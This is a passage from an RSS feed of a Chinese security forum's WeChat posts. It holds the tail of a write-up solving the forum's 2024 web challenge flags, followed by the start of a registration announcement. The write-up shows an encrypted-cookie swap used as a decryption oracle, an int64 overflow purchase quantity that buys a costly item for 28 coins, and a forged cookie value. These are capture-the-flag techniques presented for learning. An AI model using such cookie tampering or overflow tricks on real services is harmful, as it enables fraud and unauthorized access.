比较栈顶的两个值是否相等（即乘法结果和常数1是否相等），并将比较结果（0或1）压入栈顶。</p></li><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">select</code> - 基于栈顶的比较结果选择其下的两个值中的一个压入栈顶（如果比较结果为1，则选择1213159497，如果为0，则选择0）。</p></li><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">)</code> - 函数定义的结束括号，此时函数返回栈顶的值，作为结果。</p></li></ol></blockquote><p>简单总结，"get_flag12"函数计算<code style="font-family: SFMono-Regular, Consolas, ;">($var0 * 1103515245) == 1</code>的表达式，如果计算结果为真(true)，则返回1213159497，如果为假(false)，则返回0。</p><p>显然返回0不能得到flag，那就直接取1213159497作为给js的返回值</p><p>之后js逻辑照抄原页面，放到浏览器控制台运行就有答案了</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">let</span> num = <span style="color: rgb(255, 115, 253);">1213159497</span>;<br /><span style="color: rgb(150, 203, 254);">let</span> str = <span style="color: rgb(168, 255, 96);">''</span>;<br /><span style="color: rgb(150, 203, 254);">while</span> (num &gt; <span style="color: rgb(255, 115, 253);">0</span>) {<br />    str = <span style="color: rgb(255, 255, 182);">String</span>.<span style="color: rgb(255, 255, 182);">fromCodePoint</span>(num &amp; <span style="color: rgb(255, 115, 253);">0xff</span>) + str;<br />    num &gt;&gt;= <span style="color: rgb(255, 115, 253);">8</span>;<br />}<br /><span style="color: rgb(198, 197, 254);">console</span>.<span style="color: rgb(255, 255, 182);">log</span>(<span style="color: rgb(168, 255, 96);">`flag12{<span style="color: rgb(218, 239, 163);">${str}</span>}`</span>);</code></pre><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=39f70d08&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJ9T0JCRC3yabjKSicwdVNvJwNQU4BKeJhFTqOr92BWFNPmtyuvah71iapyy1RtztLwLJgXuoOucQ0A%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="414" /></p><p><br /></p><p><code style="font-family: SFMono-Regular, Consolas, ;">flag12{HOXI}</code></p><p>如果想找到这个符合条件的输入值，也可以使用数学方法。</p><blockquote><p style="margin-bottom: 15px;">我们需要找到一个整数<code style="font-family: SFMono-Regular, Consolas, ;">$var0</code>，它乘以<code style="font-family: SFMono-Regular, Consolas, ;">1103515245</code>后模32位整数溢出后的结果必须等于1。虽然可以使用一个简单的循环来搜索这样的整数，不过考虑到32位整数的范围非常大，从<code style="font-family: SFMono-Regular, Consolas, ;">-2^31</code>到<code style="font-family: SFMono-Regular, Consolas, ;">2^31-1</code>，穷举可能非常耗时。</p><p style="margin-bottom: 15px;">由已知能够写下：</p><p style="margin-bottom: 15px;"><code style="font-family: SFMono-Regular, Consolas, ;">$var0 * 1103515245 ≡ 1 (mod 2^32)</code></p><p style="margin-bottom: 15px;">这意味着<code style="font-family: SFMono-Regular, Consolas, ;">1103515245</code>在模<code style="font-family: SFMono-Regular, Consolas, ;">2^32</code>意义下的逆元是我们要寻找的<code style="font-family: SFMono-Regular, Consolas, ;">$var0</code>。因此可以使用扩展欧几里得算法来寻找这个逆元。</p><p style="margin-bottom: 15px;">下面是一个Python函数，我们将使用它来寻找<code style="font-family: SFMono-Regular, Consolas, ;">1103515245</code>模<code style="font-family: SFMono-Regular, Consolas, ;">2^32</code>的乘法逆元：</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">def</span> <span style="color: rgb(255, 255, 182);">egcd</span>(a, b):<br />       <span style="color: rgb(150, 203, 254);">if</span> a == <span style="color: rgb(255, 115, 253);">0</span>:<br />           <span style="color: rgb(150, 203, 254);">return</span> (b, <span style="color: rgb(255, 115, 253);">0</span>, <span style="color: rgb(255, 115, 253);">1</span>)<br />       <span style="color: rgb(150, 203, 254);">else</span>:<br />           g, y, x = egcd(b % a, a)<br />           <span style="color: rgb(150, 203, 254);">return</span> (g, x - (b // a) * y, y)<br /><br />    <span style="color: rgb(150, 203, 254);">def</span> <span style="color: rgb(255, 255, 182);">modinv</span>(a, m):<br />       g, x, y = egcd(a, m)<br />       <span style="color: rgb(150, 203, 254);">if</span> g != <span style="color: rgb(255, 115, 253);">1</span>:<br />           <span style="color: rgb(150, 203, 254);">raise</span> Exception(<span style="color: rgb(168, 255, 96);">'无解'</span>)<br />       <span style="color: rgb(150, 203, 254);">else</span>:<br />           <span style="color: rgb(150, 203, 254);">return</span> x % m<br /><br /><span style="color: rgb(124, 124, 124);"># 计算1103515245模2^32的逆元</span><br />modulus = <span style="color: rgb(255, 115, 253);">2</span>**<span style="color: rgb(255, 115, 253);">32</span><br />a = <span style="color: rgb(255, 115, 253);">1103515245</span><br />inverse_a = modinv(a, modulus)<br /><br />print(<span style="color: rgb(168, 255, 96);">"结果:"</span>, inverse_a)</code></pre><p style="margin-bottom: 15px;">上面的脚本首先定义了<code style="font-family: SFMono-Regular, Consolas, ;">egcd</code>函数来实现扩展欧几里得算法，并定义了<code style="font-family: SFMono-Regular, Consolas, ;">modinv</code>函数来寻找模逆。接着，我们使用<code style="font-family: SFMono-Regular, Consolas, ;">modinv</code>函数寻找<code style="font-family: SFMono-Regular, Consolas, ;">1103515245</code>在模<code style="font-family: SFMono-Regular, Consolas, ;">2^32</code>意义下的逆元。这个代码应该会返回我们所需的那个符合条件的32位整数。</p><p style="margin-bottom: 15px;">运行可得，<code style="font-family: SFMono-Regular, Consolas, ;">4005161829</code>符合题意。</p></blockquote><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=e29d73f0&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJ9T0JCRC3yabjKSicwdVNvJPDuXpeRfudKNjdfiaB8o6ibTjlYicic9epFThm64jRnYPiaibOwCRSJ0WLRg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="658" /></p><p><br /></p><h2>flagA</h2><p>回到https://2024challenge.52pojie.cn/</p><p>退出登录后按下f12，重新登录，查看登录过程的网络请求</p><p>可以发现，login请求的响应头放了两个cookie，<code style="font-family: SFMono-Regular, Consolas, ;">uid</code>和<code style="font-family: SFMono-Regular, Consolas, ;">flagA</code></p><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=ef186b26&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJ9T0JCRC3yabjKSicwdVNvJuDkcoahs0oyqHPGzicbJxBP2WHnJwibLYW9mIoVbiczMeFDp805rA2CQA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /></p><p><br /></p><p>很显然，两个都是密文，需要寻找解密方法</p><p>留意到后续请求了一个uid的接口，其返回值是uid的明文</p><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=50566c84&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJ9T0JCRC3yabjKSicwdVNvJaTq3pVKG4hYbibUQT8EM38E19BLqicZpj7VoWX9HyO2HrpBnjW9db7Vg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="743" /></p><p><br /></p><p>既然Cookie里有uid的密文，这个接口的返回值是uid的明文，那不妨直接改Cookie，把flagA的密文放到uid的位置，看看会发生什么</p><p>开发者面板的应用程序-Cookie这里提供了对Cookie的修改功能，直接替换</p><p><img border="0" class="rich_pages wxw-img" src="https://https://wechat2rss.xlab.app/img-proxy/?k=6e42adfe&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJ9T0JCRC3yabjKSicwdVNvJIhBWDnOrAfM8bL91leIgQcUYcP084hujqyJmks19jsKcPahFVzsCJg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1048" /></p><p><br /></p><p>随后回到网络面板，找到uid请求，右键-在新标签页打开</p><p>奇迹出现</p><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=698ab1fb&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJ9T0JCRC3yabjKSicwdVNvJ20Y1BkGAXjMHN1F5Im8E0XicRjzzKScKL8vLKSsUINbR61lsn4mudYg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="475" /></p><p><br /></p><h2>flagB</h2><p>先登录，回到2048的页面</p><p>一看flagB，好家伙，需要9.9亿金币</p><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=cbad39d5&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJ9T0JCRC3yabjKSicwdVNvJuIcxSJhNPy5m6j6oFgfhbDchLHKwPTzPvYiaKMldlh6AZNbfNU339tQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="753" /></p><p><br /></p><p>简单计算下，按照之前每7分钟拿到1万金币，暴力法大概需要玩480天，明显不可取。</p><p>v我50道具给的关键词也提示了我们正确思路：溢出</p><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=44cba5b7&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJ9T0JCRC3yabjKSicwdVNvJkZ3SnVxdcZuBjW3a1cdWTQ0fQCc7rfqPhW0XIBIicEOxXC3Rdg1icGoQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="498" /></p><p><br /></p><p>接下来，就需要判断金币的数据范围是什么，构造多大的溢出</p><p>先尝试最常见的int</p><blockquote><p style="margin-bottom: 15px;">int32的最大值是2^31 - 1 = 2147483647</p><p style="margin-bottom: 15px;">int64的最大值是2^63 - 1 = 9223372036854775807</p></blockquote><p>先计算出临界值对应的数量</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">&gt;&gt;&gt; (pow(2,31)-1)/999063388<br />2.149496891582619<br />&gt;&gt;&gt; (pow(2,63)-1)/999063388<br />9232018856.5</code></pre><p>先看int32，可以尝试请求买2个和3个，结果都是“钱不够”，看来不是32位溢出</p><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=c7268406&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJ9T0JCRC3yabjKSicwdVNvJRfPztvA5Gpzah5ubU7ibmRCQNhj0jSjoC0mjZfhHGXn4Jqia4bXmJjhA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="462" /></p><p><br /></p><p>尝试int64，买9232018856个和9232018857个，看看有没有区别</p><p>9232018856个仍然提示钱不够，但9232018857个出现了另一个结果</p><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=85dbfd31&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJ9T0JCRC3yabjKSicwdVNvJW9EQB2Whicm1SdyuVzTUhqZmI8GW2e78yLN9o3lPfQSkq1XjREPVHZQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="499" /></p><p><br /></p><p>由此可知为int64溢出</p><p>这里找到的溢出点相当于第一个向上溢出的点，所以钱会变多导致被拦截。</p><p>那么找到第一个向下溢出的点，钱就会正常减少，从而实现正常购买</p><p>那么从int64最大值开始逐渐尝试（我自己做题时是向服务器发送请求找到第一个提示钱不够而不是钱多了的点）即可获得一个符合要求值18464037713，刚好在64位内int64和28等效</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">&gt;&gt;&gt; bin(18464037713*999063388)<br /><span style="color: rgb(168, 255, 96);">'0b10000000000000000000000000000000000000000000000000000000000011100'</span><br />&gt;&gt;&gt; bin(28)<br /><span style="color: rgb(168, 255, 96);">'0b11100'</span></code></pre><p>直接买18464037713个，扣除28金币，得到答案</p><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=36a53eff&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJ9T0JCRC3yabjKSicwdVNvJSkN8PX6Zft4b1ZkX5r4x1FJ9ooacMwibCMZpXIDbiceO5uleiat5rXfPw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="514" /></p><p><br /></p><h2>flagC</h2><p>看页面可以看出是物品识别，要求了数量和位置必须和它的预设一致。</p><p>个人想到的方案：可以根据test.jpg提示的物品内容，把图里的各个元素单独提取出来（比如用QQ截图单独截取然后钉在桌面），然后在桌面上/某个窗口内调整位置/数量，然后利用obs的虚拟摄像头共享桌面，使用摄像头，根据返回的文字提示慢慢调整位置/数量即可解出。</p><p>以下是一个1920*1080的图片位置参考，一共四件</p><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=3f82062c&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_jpg%2FLFPriaSjBUZJ9T0JCRC3yabjKSicwdVNvJpOe70u7p5jUKoCF1pmgUl0bAaoR0BmBxX0syqVMdslMIiaO1ExfWUIA%2F640%3Fwx_fmt%3Djpeg%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /></p><p><br /></p><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=e23f13c9&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJ9T0JCRC3yabjKSicwdVNvJgzicZqu4TJkUqRPZnkSIia23ohjOfCq5q16tHKiaHG1XwbozXyBrqbNiaA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="790" /></p><p><br /></p><h2>后记</h2><p>flag8 &amp; flagB 中，游戏数据被记录在名为<code style="font-family: SFMono-Regular, Consolas, ;">game2048_user_data</code>的Cookie里，也是加密文字，按照类似flagA的做法也能还原为json，看来这里和uid以及flagA用的是同一种加密方式</p><p><img border="0" class="rich_pages wxw-img" src="https://https://wechat2rss.xlab.app/img-proxy/?k=02bcafce&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJ9T0JCRC3yabjKSicwdVNvJasjf9yCJJriaFyCkrjuzYiaBEbeFuR3icyRvmTlbrJfeT4Uee7VSf9DIg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1037" /></p><p><br /></p><p>不过如果想利用login接口尝试将其变成密文就不行了</p><p><img border="0" class="rich_pages wxw-img" src="https://https://wechat2rss.xlab.app/img-proxy/?k=ecac9385&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJ9T0JCRC3yabjKSicwdVNvJh5iawfteZFD3fzCybGy5icaDxZH1F2EwPhCmRKCCJKTLj3U8Sax4A9jA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="481" /></p><p><br /></p><p>如果这里不做验证，或许可以通过直接改JSON的方式拿到flagB</p><p>这里贴一个能过flag8和flagB的Cookie供参考</p><p><code style="font-family: SFMono-Regular, Consolas, ;">kIc8IGsHes1HrUU8gHkub17LMRmCoc1ECG583Z5eI6mczcYSrozQiobbon+ZAyDyLXKbSkQjTdSEAqCIN2ot7UFlX6PzRZNp6En5A6HeltB2Zz6Wbf8fZnY5PdfopQuR3QeQyj70Q2EbMv42pqwhy40ap3epsmxlJshH6YA0Jl16vfzL80dMsJmlnF2ju7hGXYuSjrcuDGXzyQeICcGqIdcZDe88o7JiEfsf/iQu</code></p><p>解密后：</p><p><code style="font-family: SFMono-Regular, Consolas, ;">{"game_data":{"tiles":[4,8,2,4,16,64,32,8,8,32,16,4,2,0,2,8],"score":692},"money_count":10288,"remove_piece_count":26,"flag_b_count":166176339416}</code></p><p style="margin-bottom: 0px; letter-spacing: 0.544px; color: rgb(53, 53, 53); text-align: start; background-color: rgb(255, 255, 255); line-height: 25.6px; font-family: Tahoma, Helvetica, SimSun, sans-serif;"><strong><span style="color: rgb(0, 176, 80);"><strong><span style="color: rgb(255, 255, 255); background-color: rgb(0, 176, 80);"></span></strong></span></strong></p><p style="margin-bottom: 0px; letter-spacing: 0.544px; color: rgb(53, 53, 53); text-align: start; background-color: rgb(255, 255, 255); line-height: 25.6px; font-family: Tahoma, Helvetica, SimSun, sans-serif;"><strong><span style="color: rgb(0, 176, 80);"><strong><span style="color: rgb(255, 255, 255); background-color: rgb(0, 176, 80);">-官方论坛</span></strong></span></strong><br /></p><p style="margin-top: 8px; margin-bottom: 0px; letter-spacing: 0.544px; text-align: start; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span>www.52pojie.cn</span></p><p style="margin-top: 8px; margin-bottom: 0px; letter-spacing: 0.544px; text-align: start; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span><br /></span></p><p></p><br /><p style="margin-bottom: 0px; letter-spacing: 0.544px; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span style="background-color: rgb(255, 251, 0); letter-spacing: normal; font-size: 24px;"><strong><span style="color: rgb(0, 0, 0); font-family: Verdana, Arial, Tahoma; letter-spacing: 5px; text-align: start; background-color: rgb(255, 255, 255);">👆👆👆</span></strong></span><span style="background-color: rgb(255, 251, 0); font-size: 16px; letter-spacing: normal;"><strong><span style="text-align: start; font-family: Arial, sans-serif;"><span style="color: rgb(0, 0, 0); font-family: Verdana, Arial, Tahoma; font-size: 20px; letter-spacing: 5px; background-color: rgb(255, 255, 255);"></span><strong style="font-family: Tahoma, Helvetica, SimSun, sans-serif; letter-spacing: 0.544px;"></strong></span></strong></span></p><p><span style="letter-spacing: normal;"><span style="font-size: 16px;">公众号<span style="color: rgb(255, 0, 0);"><strong>设置“星标”，</strong></span>您</span><span style="font-size: 16px; color: rgb(255, 0, 0);"><strong>不会错过</strong></span><span style="font-size: 16px;">新的消息通知<span style="color: rgb(247, 49, 49); font-family: Arial, sans-serif; font-size: 13px; text-align: start;"></span></span></span></p><br /><p><span style="letter-spacing: normal;"><span style="font-size: 16px;">如</span><strong style="font-size: 16px; letter-spacing: 0.544px;"><span style="color: rgb(255, 0, 0);">开放注册、精华文章和周边活动</span></strong><span style="font-size: 16px;">等公告</span></span></p><br /><p><span style="letter-spacing: normal;"><span style="font-size: 16px;"><br /></span></span></p><br /><p style="margin-bottom: 0px; letter-spacing: 0.544px; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><img class="rich_pages wxw-img" /></p><p style="display: none;"></p>



<p><a href="https://www.52pojie.cn/thread-1893062-1-1.html">阅读原文</a></p>
]]></content:encoded>
<pubDate>Tue, 05 Mar 2024 15:19:27 +0800</pubDate>
</item>
<item>
<title>【开放注册公告】吾爱破解论坛2024年3月13日十六周年开放注册公告</title>
<link>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140118&amp;idx=1&amp;sn=ebfd649128b56c20a3de756477233ecb&amp;chksm=bd50a0428a27295408280749dc6c261e8a5194b893e1c0a27ace4fe77317a20f7bf9b96c5a43&amp;scene=58&amp;subscene=0</link>
<guid>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140118&amp;idx=1&amp;sn=ebfd649128b56c20a3de756477233ecb&amp;chksm=bd50a0428a27295408280749dc6c261e8a5194b893e1c0a27ace4fe77317a20f7bf9b96c5a43&amp;scene=58&amp;subscene=0</guid>
<content:encoded><![CDATA[
<p>
<span>吾爱pojie</span> <span>2024-03-04 17:33</span> <span style="display: inline-block;">北京</span>
</p>

<p>内有福利，送20个账号注册码或300论坛币，吾爱破解论坛开放注册时间：2024年3月13日  12：00 -- 14：00 和  20：00 -- 22：00，赶紧上好闹钟顺便告诉小伙伴吧。</p>


<p style="margin-bottom: 0px; letter-spacing: 0.578px; text-align: center; margin-left: 8px; margin-right: 8px;">
<img src="https://https://wechat2rss.xlab.app/img-proxy/?k=4d4b4087&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_jpg%2FLFPriaSjBUZKRP0qgyCAugN0VnYiblj3nJKlOLNIr2rdoJ8hH9icGltjmpicibCjJBfUJGwHvOmVh7InDutgLUxZKxQ%2F0%3Fwx_fmt%3Djpeg" />
</p>

<h2 style="margin-top: 20px; margin-bottom: 20px; font-weight: bold; font-size: 24px; color: rgb(53, 53, 53); letter-spacing: normal; text-align: start; border-bottom: 2px solid rgb(204, 204, 204);"><span style="display: inline-block; text-indent: initial;">W</span><span style="display: inline-block; text-indent: initial;">h</span><span style="display: inline-block; text-indent: initial;">o</span><span style="display: inline-block; text-indent: initial;"> </span><span style="display: inline-block; text-indent: initial;">A</span><span style="display: inline-block; text-indent: initial;">r</span><span style="display: inline-block; text-indent: initial;">e</span><span style="display: inline-block; text-indent: initial;"> </span><span style="display: inline-block; text-indent: initial;">W</span><span style="display: inline-block; text-indent: initial;">e</span></h2><p style="margin-top: 15px; margin-bottom: 15px; letter-spacing: normal; text-align: start; color: rgb(68, 68, 68);"><span style="font-size: 14px;"><span style="display: inline-block; text-indent: initial;">吾</span><span style="display: inline-block; text-indent: initial;">爱</span><span style="display: inline-block; text-indent: initial;">破</span><span style="display: inline-block; text-indent: initial;">解</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">从</span><span style="color: rgb(0, 0, 255);"><span style="display: inline-block; text-indent: initial;">2</span><span style="display: inline-block; text-indent: initial;">0</span><span style="display: inline-block; text-indent: initial;">0</span><span style="display: inline-block; text-indent: initial;">8</span><span style="display: inline-block; text-indent: initial;">年</span><span style="display: inline-block; text-indent: initial;">3</span><span style="display: inline-block; text-indent: initial;">月</span><span style="display: inline-block; text-indent: initial;">1</span><span style="display: inline-block; text-indent: initial;">3</span><span style="display: inline-block; text-indent: initial;">日</span></span><span style="display: inline-block; text-indent: initial;">建</span><span style="display: inline-block; text-indent: initial;">立</span><span style="display: inline-block; text-indent: initial;">以</span><span style="display: inline-block; text-indent: initial;">来</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">陪</span><span style="display: inline-block; text-indent: initial;">伴</span><span style="display: inline-block; text-indent: initial;">众</span><span style="display: inline-block; text-indent: initial;">多</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">友</span><span style="display: inline-block; text-indent: initial;">走</span><span style="display: inline-block; text-indent: initial;">过</span><span style="display: inline-block; text-indent: initial;">了</span><strong><span style="color: rgb(0, 0, 255); background-color: rgb(255, 255, 0);"><span style="display: inline-block; text-indent: initial;">1</span><span style="display: inline-block; text-indent: initial;">6</span><span style="display: inline-block; text-indent: initial;">年</span></span></strong><span style="display: inline-block; text-indent: initial;">艰</span><span style="display: inline-block; text-indent: initial;">辛</span><span style="display: inline-block; text-indent: initial;">而</span><span style="display: inline-block; text-indent: initial;">辉</span><span style="display: inline-block; text-indent: initial;">煌</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">风</span><span style="display: inline-block; text-indent: initial;">雨</span><span style="display: inline-block; text-indent: initial;">历</span><span style="display: inline-block; text-indent: initial;">程</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">以</span><span style="display: inline-block; text-indent: initial;">带</span><span style="display: inline-block; text-indent: initial;">领</span><span style="display: inline-block; text-indent: initial;">新</span><span style="display: inline-block; text-indent: initial;">手</span><span style="display: inline-block; text-indent: initial;">走</span><span style="display: inline-block; text-indent: initial;">入</span><span style="color: rgb(0, 0, 255);"><span style="display: inline-block; text-indent: initial;">密</span><span style="display: inline-block; text-indent: initial;">界</span></span><span style="display: inline-block; text-indent: initial;">大</span><span style="display: inline-block; text-indent: initial;">门</span><span style="display: inline-block; text-indent: initial;">为</span><span style="display: inline-block; text-indent: initial;">基</span><span style="display: inline-block; text-indent: initial;">础</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">汇</span><span style="display: inline-block; text-indent: initial;">集</span><span style="display: inline-block; text-indent: initial;">了</span><span style="display: inline-block; text-indent: initial;">一</span><span style="display: inline-block; text-indent: initial;">大</span><span style="display: inline-block; text-indent: initial;">批</span><span style="display: inline-block; text-indent: initial;">爱</span><span style="display: inline-block; text-indent: initial;">好</span><span style="display: inline-block; text-indent: initial;">者</span><span style="display: inline-block; text-indent: initial;">在</span><span style="display: inline-block; text-indent: initial;">此</span><span style="display: inline-block; text-indent: initial;">栖</span><span style="display: inline-block; text-indent: initial;">息</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">今</span><span style="display: inline-block; text-indent: initial;">天</span><span style="display: inline-block; text-indent: initial;">我</span><span style="display: inline-block; text-indent: initial;">们</span><span style="display: inline-block; text-indent: initial;">依</span><span style="display: inline-block; text-indent: initial;">然</span><span style="display: inline-block; text-indent: initial;">不</span><span style="display: inline-block; text-indent: initial;">忘</span><span style="display: inline-block; text-indent: initial;">初</span><span style="display: inline-block; text-indent: initial;">心</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">希</span><span style="display: inline-block; text-indent: initial;">望</span><span style="display: inline-block; text-indent: initial;">起</span><span style="display: inline-block; text-indent: initial;">到</span><span style="color: rgb(0, 0, 255);"><span style="display: inline-block; text-indent: initial;">承</span><span style="display: inline-block; text-indent: initial;">上</span><span style="display: inline-block; text-indent: initial;">启</span><span style="display: inline-block; text-indent: initial;">下</span></span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">作</span><span style="display: inline-block; text-indent: initial;">用</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">带</span><span style="display: inline-block; text-indent: initial;">领</span><span style="display: inline-block; text-indent: initial;">爱</span><span style="display: inline-block; text-indent: initial;">好</span><span style="display: inline-block; text-indent: initial;">者</span><span style="display: inline-block; text-indent: initial;">们</span><span style="display: inline-block; text-indent: initial;">走</span><span style="display: inline-block; text-indent: initial;">入</span><span style="display: inline-block; text-indent: initial;">密</span><span style="display: inline-block; text-indent: initial;">界</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">圣</span><span style="display: inline-block; text-indent: initial;">殿</span><span style="display: inline-block; text-indent: initial;">。</span></span></p><h2 style="margin-top: 20px; margin-bottom: 20px; font-weight: bold; font-size: 24px; color: rgb(53, 53, 53); letter-spacing: normal; text-align: start; border-bottom: 2px solid rgb(204, 204, 204);"><span style="display: inline-block; text-indent: 